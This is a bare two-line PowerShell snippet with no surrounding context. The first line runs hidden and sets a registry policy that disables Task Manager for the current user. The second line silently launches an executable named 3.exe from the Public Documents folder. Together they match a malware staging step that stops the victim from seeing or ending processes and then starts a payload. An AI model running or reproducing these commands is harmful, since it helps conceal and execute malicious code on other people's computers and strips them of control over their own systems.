powershell -windowstyle hidden REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
powershell -windowstyle Hidden Start-Process -FilePath "C:\Users\Public\Documents\3.exe"
